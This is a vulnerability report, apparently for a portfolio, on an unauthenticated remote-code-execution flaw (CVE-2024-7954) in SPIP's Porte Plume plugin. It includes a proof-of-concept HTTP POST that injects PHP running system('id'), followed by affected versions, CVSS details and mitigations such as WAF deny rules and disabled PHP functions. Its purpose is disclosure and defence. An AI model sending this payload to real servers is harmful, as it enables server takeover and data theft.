ğŸ›¡ï¸ Vulnerability Report â€“ CVE-2024-7954: Remote Code Execution in SPIPâ€™s Porte Plume Plugin
ğŸ“Œ Affected Asset
Self-hosted instance of a CMS platform (SPIP)

ğŸ” Vulnerable Endpoint
/index.php?action=porte_plume_previsu

ğŸ§  Executive Summary

CVE-2024-7954 is a Critical vulnerability affecting the Porte Plume plugin in SPIP (a popular open-source CMS). This flaw allows unauthenticated remote code execution via a vulnerable endpoint that fails to sanitize user-supplied input and lacks access controls.

An attacker can send specially crafted HTTP requests to inject and execute arbitrary PHP code on the backend. This can lead to full server compromise, data exfiltration, or even the use of the host as a pivot for further attacks in the infrastructure.

ğŸ§¨ CVSS v3.1 Score: 9.8 (Critical)
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

ğŸ¯ Proof of Concept (PoC)
ğŸ”¬ Target (Anonymized)
CMS: SPIP (v4.1.x detected)
Vulnerable Plugin: Porte Plume
Test Server: https://[REDACTED-IP]/index.php?action=porte_plume_previsu

ğŸ”¥ Exploit Steps

Craft an HTTP POST Request:

POST /index.php?action=porte_plume_previsu HTTP/1.1
Host: [REDACTED-IP]
Content-Type: application/x-www-form-urlencoded
Content-Length: [LENGTH]

data=<?php system('id'); ?>


Send the request using Burp Suite, curl, or any HTTP client.

âœ… Observe: The server responds with the output of the id command, confirming remote code execution.

ğŸ“¸ Screenshots (Anonymized)

linode1.jpg: Raw HTTP POST sent through Burp Suite.

linode_2.jpg: Server response showing execution of system('id').

linode_3.jpg â€“ _5.jpg: Confirmation of additional commands like whoami, ls, etc.

These prove successful exploitation without authentication.

ğŸ’¥ Impact Analysis
Category	Risk Description
ğŸ–¥ï¸ Arbitrary Code Execution	Execute system commands (e.g., id, ls, cat /etc/passwd)
ğŸ”“ Full Server Compromise	Inject web shells, backdoors, modify application logic
ğŸ§  Privilege Escalation	If misconfigured, escalate to root/system-level access
ğŸªª Data Breach	Dump database credentials, configuration files, secrets
ğŸŒ Lateral Movement	Use compromised host to pivot into internal networks
ğŸ§¯ Denial of Service	Execute resource-intensive commands or corrupt system files
âš™ï¸ Technical Root Cause

The porte_plume_previsu action is meant for previewing rich text but fails to:

Authenticate users accessing the endpoint.

Sanitize or validate data input.

Block execution of PHP code sent as raw payloads.

This creates an open RCE vector, where any unauthenticated actor can deliver and execute arbitrary payloads.

ğŸ” Affected Versions
Component	Affected Versions
SPIP CMS	< 4.3.0-alpha2
SPIP 4.2 branch	< 4.2.13
SPIP 4.1 branch	< 4.1.16
Plugin: Porte Plume	All bundled versions in above releases
ğŸ“ˆ Severity Assessment
CVSS Metric	Value
Attack Vector (AV)	Network
Attack Complexity (AC)	Low
Privileges Required (PR)	None
User Interaction (UI)	None
Scope (S)	Unchanged
Confidentiality (C)	High
Integrity (I)	High
Availability (A)	High
Overall CVSS Score	9.8 â€“ Critical
âœ… Recommended Remediation
1. ğŸ”§ Upgrade SPIP Immediately

Update to one of the patched versions:

SPIP 4.3.0-alpha2

SPIP 4.2.13

SPIP 4.1.16

ğŸ‘‰ SPIP official downloads and changelogs

2. ğŸ”’ Block External Access to the Vulnerable Endpoint

At the web server or WAF level, deny direct access to the action:

# Apache (example)
<Files "index.php">
  <If "%{QUERY_STRING} =~ /action=porte_plume_previsu/">
    Require all denied
  </If>
</Files>

# Nginx
location ~* "action=porte_plume_previsu" {
    deny all;
}

3. ğŸ” Sanitize User Inputs Server-Side

Ensure all data passed into rendering or execution logic is sanitized and cannot be interpreted as PHP code or system commands.

4. ğŸ§± Secure PHP Runtime

Harden the PHP environment:

Disable dangerous functions in php.ini:

disable_functions = exec, system, passthru, shell_exec, popen, proc_open

5. ğŸ§© Implement Application Hardening

Apply Content Security Policy (CSP) headers.

Restrict file upload directories.

Enforce principle of least privilege on file and user permissions.

Monitor logs for suspicious access to /index.php?action=porte_plume_previsu.

ğŸ“š References

SPIP Security Advisory (official)

CVE Entry â€“ CVE-2024-7954 (NIST)

Common RCE Prevention Techniques (OWASP)

ğŸ““ Report Metadata
Field	Value
Vulnerability Name	Arbitrary Code Execution in SPIP
CVE ID	CVE-2024-7954
Affected Component	Porte Plume Plugin
Vulnerability Class	Remote Code Execution (Unauthenticated)
Exploitation Vector	HTTP POST/GET to /index.php?action=porte_plume_previsu
Severity (CVSS 3.1)	9.8 â€“ Critical
Exploitation Confirmed	âœ… Yes (PoC + screenshots)
Detection Method	Manual Testing
Disclosure Type	Responsible, anonymized for sharing
âœï¸ Methodology

This vulnerability was identified and verified through:

Manual enumeration of action= parameters in exposed index.php routes.

Testing for unsanitized parameter injection.

Confirming unauthenticated access and code execution using benign payloads (system('id')).

Evaluating impact and mapping it to real-world exploitation vectors.

Documenting the exploit flow, server behavior, and mitigation strategy.

This demonstrates expertise in:

Identifying under-documented CVEs in open-source CMS platforms

Reproducing critical RCE scenarios safely

Understanding remediation in shared hosting environments

âœ… Conclusion

CVE-2024-7954 represents a clear and present danger to any deployment running SPIP below the patched versions. The ability to achieve unauthenticated remote code execution puts all data, user sessions, and hosted services at risk. This report confirms exploitation, outlines the technical flow, and provides effective, actionable mitigation.

ğŸ“¢ Note: This report is anonymized and intended for educational and demonstrative purposes only. No proprietary or sensitive systems are exposed.
